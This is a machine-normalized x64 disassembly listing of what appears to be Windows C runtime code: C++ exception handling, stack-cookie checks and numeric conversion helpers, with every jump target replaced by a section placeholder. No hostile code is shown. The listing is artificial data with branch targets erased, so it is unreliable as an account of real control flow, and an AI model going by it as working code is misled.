mov rsi [ rsp + 0xc8 ]
cmp [ rsp + 0xc0 ] 0x0
je r-xdata
lea r9 [ rsi + 0x20 ]
mov r8d [ rsi + 0x18 ]
mov edx [ rsi + 0x4 ]
mov ecx [ rsi ]
mov dl 0x1
mov rcx rsi
call sub_1800127f0
mov r11 [ rsp + 0x40 ]
lea r9 [ r11 + 0x20 ]
mov r8d [ r11 + 0x18 ]
mov edx [ r11 + 0x4 ]
mov ecx [ r11 ]
jmp r-xdata
call sub_180007a4c
mov [ rax + 0xf0 ] r15
call sub_180007a4c
mov [ rax + 0xf8 ] rdi
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r12 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x80
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp [ rsi ] 0xe06d7363
jne r-xdata
call [ RaiseException@IAT ]
mov r13d [ rsp + 0x20 ]
mov rbx [ rsp + 0x48 ]
mov rdi [ rsp + 0xd8 ]
mov r15 [ rsp + 0xd0 ]
mov r12 [ rsp + 0x60 ]
mov r14 [ rsp + 0x50 ]
mov rcx r14
call sub_180011520
test r13d r13d
jne r-xdata
cmp [ rsi + 0x18 ] 0x4
jne r-xdata
cmp [ rsi + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rsi + 0x28 ]
call sub_1800114ec
test eax eax
je r-xdata
cmp [ rsi + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rsi
call sub_1800127f0
cmp [ rsi + 0x20 ] 0x19930522
jne r-xdata
sub_180012b40
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov rsi r9
mov rdi r8
mov r12 rdx
mov r14 rcx
xor ebx ebx
mov r13d [ r8 + 0x4 ]
test r13d r13d
je r-xdata
mov r11 rbx
movsxd r13 r13d
call sub_1800110e8
lea r11 [ r13 + rax ]
jmp r-xdata
xor eax eax
test r13d r13d
je r-xdata
test r11 r11
je r-xdata
mov r11 rbx
call sub_1800110e8
mov r11 rax
movsxd rax [ rdi + 0x4 ]
add r11 rax
jmp r-xdata
cmp [ rdi + 0x8 ] ebx
jne r-xdata
cmp [ r11 + 0x10 ] bl
je r-xdata
mov ecx [ rdi ]
test ecx ecx
js r-xdata
test [ rdi ] 0x80000000
je r-xdata
mov edi 0x1
test cl 0x8
je r-xdata
movsxd rax [ rdi + 0x8 ]
add rax [ r12 ]
mov r12 rax
test [ rsi ] dil
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_180013d38
test eax eax
je r-xdata
cmp [ rsi + 0x18 ] ebx
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_180013d38
test eax eax
je r-xdata
call sub_18000db64
mov edx edi
mov rcx r12
call sub_180013d38
test eax eax
je r-xdata
mov r11 rbx
call sub_180011100
mov r11 rax
movsxd rax [ rsi + 0x18 ]
add r11 rax
jmp r-xdata
mov edx edi
mov rcx r12
call sub_180013d38
test eax eax
je r-xdata
mov rcx [ r14 + 0x28 ]
mov [ r12 ] rcx
call sub_180013d38
test eax eax
je r-xdata
call sub_180013d38
test eax eax
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
test r11 r11
jne r-xdata
movsxd r8 [ rsi + 0x14 ]
mov rdx [ r14 + 0x28 ]
mov rcx r12
call sub_180006a70
cmp [ rsi + 0x14 ] 0x8
jne r-xdata
mov eax ebx
jmp r-xdata
mov edx edi
mov rcx r12
call sub_180013d38
test eax eax
je r-xdata
mov edx edi
mov rcx r12
call sub_180013d38
test eax eax
je r-xdata
cmp [ r12 ] rbx
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
cmp [ rsi + 0x18 ] ebx
je r-xdata
movsxd r10 [ rsi + 0x14 ]
lea rdx [ rsi + 0x8 ]
mov rcx [ r14 + 0x28 ]
call sub_180012834
mov rdx rax
mov r8 r10
mov rcx r12
call sub_180006a70
jmp r-xdata
mov rcx [ r12 ]
jmp r-xdata
mov rcx rbx
call sub_180011100
mov rcx rax
movsxd rax [ rsi + 0x18 ]
add rcx rax
jmp r-xdata
lea rdx [ rsi + 0x8 ]
call sub_180012834
mov [ r12 ] rax
jmp r-xdata
mov al [ rsi ]
and al 0x4
neg al
sbb ecx ecx
neg ecx
add ecx edi
mov ebx ecx
mov [ rsp + 0x20 ] ecx
jmp r-xdata
call sub_180013d38
test eax eax
je r-xdata
sub_180012d44
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx r9
mov rsi rcx
test [ r8 ] 0x80000000
je r-xdata
movsxd rdi [ r8 + 0x8 ]
add rdi [ rdx ]
mov rdi rdx
jmp r-xdata
xor r10d r10d
cmp [ rbx + 0x18 ] r10d
je r-xdata
dec eax
jne r-xdata
call sub_180012b40
dec eax
je r-xdata
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_180012834
mov rdx rax
mov rcx rdi
call r10
call sub_180011100
movsxd r10 [ rbx + 0x18 ]
add r10 rax
jmp r-xdata
xor r10d r10d
cmp [ rbx + 0x18 ] r10d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_180012834
mov rdx rax
mov r8d 0x1
mov rcx rdi
call r10
jmp r-xdata
call sub_180011100
mov r10 rax
movsxd rax [ rbx + 0x18 ]
add r10 rax
sub_180012df4
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x50
mov r13 [ rsp + 0xa0 ]
mov rbp r9
mov r12 rdx
mov r14 r8
mov rbx rcx
lea r9 [ rax + 0x10 ]
mov r8 r13
mov rdx rbp
mov rcx r12
call sub_180010ffc
mov r9 [ rsp + 0xb0 ]
mov rsi [ rsp + 0xa8 ]
mov rdi rax
test r9 r9
je r-xdata
call sub_1800110e8
movsxd rcx [ rsi + 0xc ]
mov r9 rdi
add rax rcx
mov cl [ rsp + 0xc0 ]
mov r8 r14
mov [ rsp + 0x40 ] cl
mov rcx [ rsp + 0xb8 ]
mov [ rsp + 0x38 ] rbp
mov edx [ rcx ]
mov [ rsp + 0x30 ] r13
mov rcx r12
mov [ rsp + 0x28 ] edx
mov rdx rbx
mov [ rsp + 0x20 ] rax
call sub_180011580
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov r8 rsi
mov rdx rax
mov rcx rbx
call sub_180012d44
sub_180012eb8
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] r8
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x60
cmp [ rcx ] 0x80000003
mov r14 r9
mov r12 r8
mov r15 rdx
mov rsi rcx
je r-xdata
mov rbx [ rsp + 0xa8 ]
add rsp 0x60
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
call sub_180007a4c
mov edi [ rsp + 0xd0 ]
mov rbp [ rsp + 0xc0 ]
cmp [ rax + 0xe0 ] 0x0
je r-xdata
cmp [ rbp + 0xc ] 0x0
jne r-xdata
call sub_180007a4c
mov rbx rax
call EncodePointer
cmp [ rbx + 0xe0 ] rax
je r-xdata
mov r12d [ rsp + 0xc8 ]
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x30 ] r14
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0xa0 ]
mov r8d edi
mov r9d r12d
mov rdx rbp
mov rcx r15
mov [ rsp + 0x20 ] rax
call sub_18001137c
mov ecx [ rsp + 0xa0 ]
cmp ecx [ rsp + 0x50 ]
jae r-xdata
call sub_18000db64
cmp [ rsi ] 0xe0434f4d
je r-xdata
lea rdi [ rax + 0xc ]
cmp [ rsi ] 0xe0434352
je r-xdata
inc ecx
add rdi 0x14
mov [ rsp + 0xa0 ] ecx
cmp ecx [ rsp + 0x50 ]
jb r-xdata
cmp r12d [ rdi - 0x8 ]
jg r-xdata
mov rax [ rsp + 0xd8 ]
mov r9 r14
mov r8 r12
mov [ rsp + 0x30 ] rax
mov rdx r15
mov rcx rsi
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rbp
call sub_180011328
test eax eax
jne r-xdata
lea r13 [ rdi - 0xc ]
cmp r12d [ r13 ]
jl r-xdata
call sub_1800110e8
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
xor eax eax
call sub_1800110e8
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_1800110e8
add rax rbx
jmp r-xdata
call sub_1800110e8
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
test [ rax + rdx - 0x14 ] 0x40
jne r-xdata
call sub_1800110e8
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov ecx [ rsp + 0xa0 ]
call sub_1800110e8
mov ecx [ rdi ]
mov r8 [ rsp + 0xb0 ]
dec ecx
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x38 ] r13
and [ rsp + 0x30 ] 0x0
movsxd rcx ecx
mov r9 r14
lea rdx [ rcx + rcx * 4 ]
lea rcx [ rax + rdx * 4 ]
movsxd rax [ rdi + 0x4 ]
mov rdx r15
add rcx rax
mov [ rsp + 0x28 ] rcx
mov rcx rsi
mov [ rsp + 0x20 ] rbp
call sub_180012df4
xor eax eax
call sub_1800110e8
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_1800110e8
add rax rbx
jmp r-xdata
cmp [ rax + 0x10 ] 0x0
jne r-xdata
sub_1800130f0
mov rax rsp
mov [ rax + 0x20 ] rbx
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x3f ]
sub rsp 0x90
mov rbx [ rbp + 0x67 ]
mov r13 rdx
mov rdi rcx
xor r14b r14b
mov rdx r9
mov rcx rbx
mov r15 r9
mov r12 r8
mov [ rbp + 0x47 ] r14b
call sub_1800123fc
lea r9 [ rbp - 0x21 ]
mov r8 rbx
mov rdx r15
mov rcx r13
mov esi eax
call sub_180010ffc
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_180012474
mov r8 rbx
mov rdx r15
cmp esi eax
jle r-xdata
mov rcx r13
call sub_180012474
mov esi eax
lea rcx [ rbp - 0x21 ]
mov r9d esi
call sub_18001242c
mov r9d esi
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_180012438
jmp r-xdata
call sub_18000db64
cmp esi [ rbx + 0x4 ]
jl r-xdata
cmp esi 0xffffffff
jl r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
cmp [ rbx + 0xc ] 0x0
jbe r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
call sub_180007a4c
cmp [ rax + 0x108 ] 0x0
je r-xdata
cmp [ rbp + 0x6f ] 0x0
jne r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
mov rbx [ rsp + 0xe8 ]
add rsp 0x90
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
call sub_18000db64
call sub_18000db40
mov rax [ rbp + 0x7f ]
mov r9 r15
mov r8 r12
mov [ rsp + 0x38 ] rax
mov eax [ rbp + 0x77 ]
mov rdx r13
mov [ rsp + 0x30 ] eax
mov rcx rdi
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call sub_180012eb8
jmp r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
cmp [ rdi + 0x30 ] 0x0
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
call sub_180007a4c
cmp [ rax + 0xf0 ] 0x0
je r-xdata
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
cmp [ rbx + 0xc ] 0x0
jbe r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
call sub_180007a4c
mov rdi [ rax + 0xf0 ]
call sub_180007a4c
mov rcx [ rdi + 0x38 ]
mov r12 [ rax + 0xf8 ]
mov [ rbp + 0x57 ] r12
call sub_180011134
mov edx 0x1
mov rcx rdi
call sub_180013d38
test eax eax
jne r-xdata
mov eax [ rbx ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
mov r8d [ rbp + 0x77 ]
lea rax [ rbp - 0x31 ]
mov [ rsp + 0x30 ] r15
mov [ rsp + 0x28 ] rax
lea rax [ rbp - 0x39 ]
mov r9d esi
mov rdx rbx
mov rcx r13
mov [ rsp + 0x20 ] rax
call sub_18001137c
mov ecx [ rbp - 0x39 ]
mov edx [ rbp - 0x31 ]
cmp ecx edx
jae r-xdata
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
call sub_18000db64
mov esi [ rbx + 0x20 ]
test esi esi
je r-xdata
lea r12 [ rax + 0x10 ]
call sub_180007a4c
cmp [ rax + 0x108 ] 0x0
je r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
xor eax eax
movsxd rsi esi
call sub_1800110e8
add rax rsi
jmp r-xdata
inc ecx
add r12 0x14
mov [ rbp - 0x39 ] ecx
cmp ecx edx
jb r-xdata
cmp esi [ r12 - 0xc ]
jg r-xdata
call sub_180007a4c
mov r12 [ rax + 0x108 ]
call sub_180007a4c
mov rdx r12
and [ rax + 0x108 ] 0x0
mov rcx rdi
call sub_180012858
test al al
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
test esi esi
je r-xdata
test rax rax
je r-xdata
cmp [ r12 - 0x10 ] esi
jg r-xdata
test r14b r14b
jne r-xdata
call sub_1800110e8
movsxd r13 [ r12 ]
mov r14d [ r12 - 0x4 ]
add r13 rax
mov r12 [ rbp + 0x57 ]
xor r13d r13d
cmp [ r12 ] r13d
jle r-xdata
cmp [ rdi + 0x30 ] 0x0
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
xor edx edx
call sub_1800110e8
mov rdx rax
movsxd rax [ rbx + 0x20 ]
add rdx rax
jmp r-xdata
mov r14b [ rbp + 0x47 ]
mov r13 [ rbp + 0x4f ]
call sub_180011100
mov rcx [ rdi + 0x30 ]
movsxd rdx [ rcx + 0xc ]
lea rax [ rax + rdx + 0x4 ]
mov [ rbp - 0x29 ] rax
call sub_180011100
mov rcx [ rdi + 0x30 ]
movsxd rdx [ rcx + 0xc ]
mov ecx [ rax + rdx ]
mov [ rbp - 0x35 ] ecx
test ecx ecx
jle r-xdata
call sub_18000db40
xor esi esi
call sub_18000db64
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
lea r9 [ rbp + 0x47 ]
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_180010ffc
mov cl [ rbp + 0x6f ]
mov r8 [ rbp + 0x57 ]
mov [ rsp + 0x40 ] cl
mov [ rsp + 0x38 ] r15
mov [ rsp + 0x30 ] rbx
or [ rsp + 0x28 ] 0xffffffff
and [ rsp + 0x20 ] 0x0
mov r9 rax
mov rdx rdi
mov rcx r13
call sub_180011580
mov rcx rdi
call sub_180012858
test al al
jne r-xdata
dec r14d
add r13 0x14
jmp r-xdata
call sub_180011100
mov rcx [ rbp - 0x29 ]
mov r8 [ rdi + 0x30 ]
movsxd rcx [ rcx ]
add rax rcx
mov rcx r13
mov rdx rax
mov [ rbp - 0x19 ] rax
call sub_1800124ec
test eax eax
jne r-xdata
xor eax eax
call sub_1800110e8
movsxd rcx [ r12 + 0x4 ]
add rax rsi
movsxd rbx [ rcx + rax + 0x4 ]
call sub_1800110e8
add rax rbx
jmp r-xdata
test r14d r14d
jle r-xdata
mov al [ rbp + 0x6f ]
mov r8 [ rbp + 0x57 ]
mov r14b 0x1
mov [ rsp + 0x40 ] al
lea rax [ r12 - 0x10 ]
mov r9 r15
mov [ rsp + 0x38 ] rax
mov rax [ rbp - 0x19 ]
mov rcx rdi
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] r13
mov r13 [ rbp + 0x4f ]
mov rdx r13
mov [ rbp + 0x47 ] r14b
mov [ rsp + 0x20 ] rbx
call sub_180012df4
jmp r-xdata
mov eax [ rbp - 0x35 ]
add [ rbp - 0x29 ] 0x4
dec eax
mov [ rbp - 0x35 ] eax
test eax eax
jg r-xdata
mov dl 0x1
mov rcx rdi
call sub_1800127f0
lea r11 [ r--data ]
lea rdx [ rbp + 0x47 ]
lea rcx [ rbp - 0x11 ]
mov [ rbp + 0x47 ] r11
call sub_1800074d4
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x11 ]
mov [ rbp - 0x11 ] r11
call sub_180007e0c
int3
inc r13d
add rsi 0x14
cmp r13d [ r12 ]
jl r-xdata
lea rdx [ rw-data ]
mov rcx rax
call sub_18000776c
test al al
jne r-xdata
mov edx [ rbp - 0x31 ]
mov ecx [ rbp - 0x39 ]
call sub_1800110e8
movsxd rcx [ r12 + 0x4 ]
add rax rsi
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
sub_1800135e4
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r14
sub rsp 0x40
mov rbp r9
mov r12 r8
mov rsi rdx
mov rbx rcx
call sub_180007a4c
mov rdi [ rsp + 0x80 ]
cmp [ rax + 0x2c0 ] 0x0
mov edx 0x1fffffff
mov r8d 0x80000029
mov r9d 0x80000026
mov r14d 0x1
jne r-xdata
mov eax [ rbx + 0x4 ]
test al 0x66
je r-xdata
cmp [ rbx ] 0xe06d7363
je r-xdata
cmp [ rdi + 0xc ] 0x0
jne r-xdata
cmp [ rdi + 0x4 ] 0x0
je r-xdata
cmp [ rbx ] r8d
jne r-xdata
cmp [ rbx ] 0xe06d7363
jne r-xdata
mov eax [ rdi ]
and eax edx
cmp eax 0x19930521
jb r-xdata
mov eax r14d
cmp [ rsp + 0x88 ] 0x0
jne r-xdata
cmp [ rbx ] r9d
je r-xdata
cmp [ rbx + 0x18 ] 0xf
jne r-xdata
mov rax [ rsp + 0x90 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] rax
mov eax [ rsp + 0x88 ]
mov rdx rsi
mov [ rsp + 0x30 ] eax
mov al [ rsp + 0x98 ]
mov rcx rbx
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] rdi
call sub_1800130f0
cmp [ rbx + 0x18 ] 0x3
jb r-xdata
cmp [ rdi + 0x20 ] 0x0
je r-xdata
and eax 0x20
je r-xdata
mov ecx [ rdi ]
and ecx edx
cmp ecx 0x19930522
jb r-xdata
cmp [ rbx + 0x60 ] 0x19930520
je r-xdata
cmp [ rbx + 0x20 ] 0x19930522
jbe r-xdata
xor eax eax
call sub_1800110e8
movsxd rcx [ rdi + 0x20 ]
add rax rcx
jmp r-xdata
test eax eax
je r-xdata
cmp [ rbx ] r9d
jne r-xdata
test [ rdi + 0x24 ] r14b
jne r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x8 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov r8 rdi
mov rdx rbp
mov rcx rsi
call sub_180011150
jmp r-xdata
cmp [ rbx ] r8d
jne r-xdata
mov r8 [ r12 + 0xf8 ]
mov rdx rbp
mov rcx rdi
call sub_180012370
mov ebx eax
cmp eax 0xffffffff
jl r-xdata
xor r11d r11d
call sub_180011100
mov rcx [ rbx + 0x30 ]
movsxd r11 [ rcx + 0x8 ]
add r11 rax
jmp r-xdata
mov esi [ rbx + 0x38 ]
cmp esi 0xffffffff
jl r-xdata
call sub_18000db64
cmp eax [ rdi + 0x4 ]
jl r-xdata
movzx eax [ rsp + 0x98 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] eax
mov rax [ rsp + 0x90 ]
mov rdx rsi
mov [ rsp + 0x30 ] rax
mov eax [ rsp + 0x88 ]
mov rcx rbx
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rdi
call r11
jmp r-xdata
test r11 r11
je r-xdata
call sub_18000db64
cmp esi [ rdi + 0x4 ]
jl r-xdata
mov r9d ebx
mov rcx rsi
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x40
pop r14
pop r12
pop rdi
retn
mov rcx [ rbx + 0x28 ]
mov r9d esi
jmp r-xdata
mov rdx rbp
mov r8 rdi
call sub_180012664
jmp r-xdata
sub_18001380c
push rbx
sub rsp 0x40
cmp [ rw-data ] 0x0
movsxd rbx ecx
jne r-xdata
lea rcx [ rsp + 0x20 ]
xor edx edx
call sub_18000643c
mov rax [ rsp + 0x20 ]
cmp [ rax + 0x10c ] 0x1
jle r-xdata
mov rax [ rw-data ]
movzx eax [ rax + rbx * 2 ]
and eax 0x4
jmp r-xdata
mov rax [ rax + 0x140 ]
movzx r11d [ rax + rbx * 2 ]
and r11d 0x4
lea r8 [ rsp + 0x20 ]
mov edx 0x4
mov ecx ebx
call sub_18000bf98
mov r11d eax
jmp r-xdata
add rsp 0x40
pop rbx
retn
mov eax r11d
mov rax [ rsp + 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rsp + 0x38 ] 0x0
je r-xdata
sub_18001388c
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rdi
push rbp
mov rbp rsp
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
mov rdi rcx
mov rbx rdx
lea rcx [ rbp - 0x40 ]
mov rdx r8
call sub_18000643c
lea r11 [ rbp - 0x40 ]
lea rdx [ rbp - 0x20 ]
mov [ rsp + 0x38 ] r11
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea rcx [ rbp - 0x18 ]
xor r9d r9d
mov r8 rbx
call sub_1800148dc
lea rcx [ rbp - 0x18 ]
mov rdx rdi
mov ebx eax
call sub_180013d44
mov edx 0x3
test dl bl
jne r-xdata
test bl 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
test bl 0x2
je r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
mov eax 0x4
jmp r-xdata
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x28 ] 0x0
je r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
mov eax edx
jmp r-xdata
mov rcx [ rbp - 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_180006220
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
xor eax eax
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_18001398c
mov [ rsp + 0x18 ] rbx
mov [ rsp + 0x20 ] rdi
push rbp
mov rbp rsp
sub rsp 0x80
mov rax [ rw-data ]
xor rax rsp
mov [ rbp - 0x8 ] rax
mov rdi rcx
mov rbx rdx
lea rcx [ rbp - 0x40 ]
mov rdx r8
call sub_18000643c
lea r11 [ rbp - 0x40 ]
lea rdx [ rbp - 0x20 ]
mov [ rsp + 0x38 ] r11
and [ rsp + 0x30 ] 0x0
and [ rsp + 0x28 ] 0x0
and [ rsp + 0x20 ] 0x0
lea rcx [ rbp - 0x18 ]
xor r9d r9d
mov r8 rbx
call sub_1800148dc
lea rcx [ rbp - 0x18 ]
mov rdx rdi
mov ebx eax
call sub_180014310
mov edx 0x3
test dl bl
jne r-xdata
test bl 0x1
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
test bl 0x2
je r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
mov eax 0x4
jmp r-xdata
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
cmp [ rbp - 0x28 ] 0x0
je r-xdata
cmp [ rbp - 0x28 ] 0x0
je r-xdata
mov eax edx
jmp r-xdata
mov rcx [ rbp - 0x30 ]
and [ rcx + 0xc8 ] 0xfffffffd
mov rcx [ rbp - 0x8 ]
xor rcx rsp
call sub_180006220
lea r11 [ rsp + 0x80 ]
mov rbx [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
mov rsp r11
pop rbp
retn
xor eax eax
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
mov rax [ rbp - 0x30 ]
and [ rax + 0xc8 ] 0xfffffffd
jmp r-xdata
sub_180013a8c
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov r10 [ r9 + 0x10 ]
xor r11d r11d
mov rbx rcx
test rcx rcx
jne r-xdata
test rdx rdx
je r-xdata
call sub_180006ee4
mov ebx 0x16
mov eax r11d
test r8d r8d
mov [ rcx ] r11b
cmovg eax r8d
inc eax
cdqe
cmp rdx rax
ja r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rcx ] 0x30
lea rax [ rcx + 0x1 ]
jmp r-xdata
call sub_180006ee4
mov ebx 0x22
jmp r-xdata
test r8d r8d
jg r-xdata
mov [ rax ] ebx
call sub_180008e08
mov eax ebx
jmp r-xdata
cmp [ r10 ] r11b
je r-xdata
mov [ rax ] r11b
js r-xdata
mov ecx 0x30
movsx ecx [ r10 ]
inc r10
jmp r-xdata
cmp [ rbx ] 0x31
jne r-xdata
cmp [ r10 ] 0x35
jl r-xdata
mov [ rax ] cl
inc rax
dec r8d
lea rcx [ rbx + 0x1 ]
call sub_18000be60
lea rdx [ rbx + 0x1 ]
mov rcx rbx
lea r8 [ rax + 0x1 ]
call sub_180006a70
inc [ r9 + 0x4 ]
jmp r-xdata
jmp r-xdata
xor eax eax
dec rax
cmp [ rax ] 0x39
je r-xdata
mov [ rax ] 0x30
inc [ rax ]
sub_180013b58
mov [ rsp + 0x8 ] rbx
movzx r11d [ rdx + 0x6 ]
mov r9 rcx
mov ecx [ rdx + 0x4 ]
movzx r8d r11w
mov eax 0x8000
mov r10d 0x7ff
shr r8w 0x4
and r11w ax
mov eax [ rdx ]
and r8w r10w
and ecx 0xfffff
mov ebx 0x80000000
movzx edx r8w
test edx edx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx r10d
je r-xdata
mov edx 0x3c01
add r8w dx
xor ebx ebx
test eax eax
jne r-xdata
mov r8d 0x7fff
jmp r-xdata
mov edx 0x3c00
add r8w dx
jmp r-xdata
mov [ r9 + 0x4 ] r10d
test r10d r10d
jns r-xdata
and [ r9 + 0x4 ] eax
and [ r9 ] eax
jmp r-xdata
mov r10d eax
shl ecx 0xb
shr r10d 0x15
or r10d ecx
or r10d ebx
shl eax 0xb
mov [ r9 ] eax
jmp r-xdata
mov edx [ r9 ]
lea eax [ r10 + r10 ]
mov ecx edx
shr ecx 0x1f
mov r10d ecx
or r10d eax
lea eax [ rdx + rdx ]
mov [ r9 ] eax
mov eax 0xffff
add r8w ax
or r11w r8w
mov rbx [ rsp + 0x8 ]
mov [ r9 + 0x8 ] r11w
retn
sub_180013c20
push rbp
push rbx
push rsi
push rdi
lea rbp [ rsp - 0x3f ]
sub rsp 0x88
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x27 ] rax
mov rdi rdx
mov [ rbp - 0x19 ] rcx
lea rdx [ rbp - 0x19 ]
lea rcx [ rbp - 0x9 ]
mov rbx r9
mov rsi r8
call sub_180013b58
mov rax [ rbp - 0x9 ]
xor r8d r8d
mov [ rbp - 0x19 ] rax
movzx eax [ rbp - 0x1 ]
lea r9 [ rbp + 0x7 ]
lea edx [ r8 + 0x11 ]
lea rcx [ rbp - 0x19 ]
mov [ rbp - 0x11 ] ax
call sub_180015140
movsx ecx [ rbp + 0x9 ]
lea r8 [ rbp + 0xb ]
mov [ rdi ] ecx
movsx ecx [ rbp + 0x7 ]
mov rdx rbx
mov [ rdi + 0x4 ] ecx
mov rcx rsi
mov [ rdi + 0x8 ] eax
call sub_180009e10
test eax eax
jne r-xdata
and [ rsp + 0x20 ] 0x0
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008d64
int3
mov [ rdi + 0x10 ] rsi
mov rax rdi
mov rcx [ rbp + 0x27 ]
